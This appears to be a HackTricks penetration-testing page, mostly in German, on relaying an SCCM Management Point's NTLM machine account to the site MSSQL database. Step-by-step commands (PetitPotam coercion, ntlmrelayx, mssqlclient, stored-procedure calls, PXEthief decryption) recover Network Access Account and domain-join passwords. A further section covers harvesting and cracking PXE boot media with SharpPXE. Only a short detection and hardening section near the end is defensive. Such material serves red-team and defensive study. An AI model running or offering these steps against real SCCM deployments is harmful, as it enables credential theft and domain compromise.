# SCCM Management Point NTLM Relay to SQL – OSD-Policy-Geheimnisse extrahieren

{{#include ../../banners/hacktricks-training.md}}

## Kurzfassung
Durch Erzwingen, dass sich ein **System Center Configuration Manager (SCCM) Management Point (MP)** über SMB/RPC authentifiziert und das NTLM-Maschinenkonto an die **site database (MSSQL)** relayed wird, erhält man `smsdbrole_MP` / `smsdbrole_MPUserSvc` Rechte. Diese Rollen erlauben das Aufrufen einer Reihe von Stored Procedures, die **Operating System Deployment (OSD)** Policy-Blobs (Network Access Account credentials, Task-Sequence variables, usw.) offenlegen. Die Blobs sind hex-codiert/verschlüsselt, können aber mit **PXEthief** dekodiert und entschlüsselt werden, sodass Klartext-Secrets entstehen.

Überblick der Schritte:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. werden wiederhergestellt, ohne PXE oder Clients anzufassen.

---

## 1. Auflisten nicht-authentifizierter MP-Endpunkte
Die MP-ISAPI-Erweiterung **GetAuth.dll** stellt mehrere Parameter bereit, die keine Authentifizierung erfordern (außer die Site ist PKI-only):

| Parameter | Zweck |
|-----------|-------|
| `MPKEYINFORMATIONMEDIA` | Gibt den öffentlichen Schlüssel des Site-Signing-Zertifikats zurück + GUIDs der *x86* / *x64* **All Unknown Computers** Geräte. |
| `MPLIST` | Listet alle Management-Points in der Site auf. |
| `SITESIGNCERT` | Gibt das Signing-Zertifikat der Primary-Site zurück (ermöglicht Identifizierung des Site-Servers ohne LDAP). |

Sammle die GUIDs, die später als die **clientID** für DB-Abfragen dienen werden:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay des MP-Computerkontos an MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wenn die coercion ausgelöst wird, sollten Sie etwas wie Folgendes sehen:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. OSD-Richtlinien über gespeicherte Prozeduren identifizieren
Verbinde dich durch den SOCKS proxy (Port 1080 standardmäßig):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Wechseln Sie zur **CM_<SiteCode>** DB (verwenden Sie den 3-stelligen Site-Code, z. B. `CM_001`).

### 3.1  Unknown-Computer GUIDs finden (optional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Zugewiesene Richtlinien auflisten
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Jede Zeile enthält `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Fokus auf Policies:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – Kann run-as accounts enthalten

### 3.3  Vollständigen Body abrufen
Wenn Sie bereits `PolicyID` & `PolicyVersion` haben, können Sie die clientID-Anforderung mit folgendem umgehen:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> WICHTIG: In SSMS erhöhen Sie “Maximum Characters Retrieved” (>65535) oder der blob wird abgeschnitten.

---

## 4. Blob decodieren & entschlüsseln
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Beispiel für wiederhergestellte secrets:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevante SQL-Rollen & Prozeduren
Beim Relay wird der Login folgenden Rollen zugeordnet:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Diese Rollen gewähren Dutzende von EXEC-Berechtigungen; die für diesen Angriff wichtigsten sind:

| Gespeicherte Prozedur | Zweck |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Listet die auf eine `clientID` angewendeten Richtlinien. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gibt den vollständigen Policy-Inhalt zurück. |
| `MP_GetListOfMPsInSiteOSD` | Wird vom Pfad `MPKEYINFORMATIONMEDIA` zurückgegeben. |

Sie können die vollständige Liste mit folgendem Befehl einsehen:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: Sende eine PXE-Boot-Anfrage an einen für PXE konfigurierten Distribution Point. Die proxyDHCP-Antwort offenbart Boot-Pfade wie `SMSBoot\\x64\\pxe\\variables.dat` (verschlüsselte Konfiguration) und `SMSBoot\\x64\\pxe\\boot.bcd` sowie optional einen verschlüsselten Schlüssel-Blob.
* **Retrieve boot artifacts via TFTP**: Nutze die zurückgegebenen Pfade, um `variables.dat` über TFTP (unauthenticated) herunterzuladen. Die Datei ist klein (ein paar KB) und enthält die verschlüsselten Medien-Variablen.
* **Decrypt or crack**:
- Wenn die Antwort den Entschlüsselungsschlüssel enthält, gib ihn an **SharpPXE**, um `variables.dat` direkt zu entschlüsseln.
- Wenn kein Schlüssel enthalten ist (PXE-Medien durch ein benutzerdefiniertes Passwort geschützt), erzeugt SharpPXE einen **Hashcat-compatible** `$sccm$aes128$...`-Hash zum Offline-Cracken. Nach Wiederherstellung des Passworts die Datei entschlüsseln.
* **Parse decrypted XML**: Im Klartext enthaltene Variablen zeigen SCCM-Deployment-Metadaten (**Management Point URL**, **Site Code**, Medien-GUIDs und andere Identifier). SharpPXE parst diese und gibt einen sofort ausführbaren **SharpSCCM**-Befehl mit vorbefüllten GUID/PFX/Site-Parametern für weiterführenden Missbrauch aus.
* **Requirements**: Nur Netzwerk-Erreichbarkeit zum PXE-Listener (UDP/4011) und TFTP erforderlich; keine lokalen Admin-Rechte nötig.

---

## 7. Detection & Hardening
1. **Überwache MP-Logins** – jedes MP-Computerkonto, das sich von einer IP anmeldet, die nicht sein Host ist ≈ relay.
2. Aktiviere **Extended Protection for Authentication (EPA)** in der Site-Datenbank (`PREVENT-14`).
3. Deaktiviere ungenutztes NTLM, erzwinge SMB signing, beschränke RPC (gleiche Gegenmaßnahmen wie gegen `PetitPotam`/`PrinterBug`).
4. Absichern der MP ↔ DB-Kommunikation mit IPSec / mutual-TLS.
5. **PXE-Exposure einschränken** – Firewall-Regeln für UDP/4011 und TFTP auf vertrauenswürdige VLANs, PXE-Passwörter verlangen und Alarmieren bei TFTP-Downloads von `SMSBoot\\*\\pxe\\variables.dat`.

---

## See also
* NTLM relay-Grundlagen:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [Ich möchte mit Ihrem Manager sprechen: Das Stehlen von Geheimnissen über Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
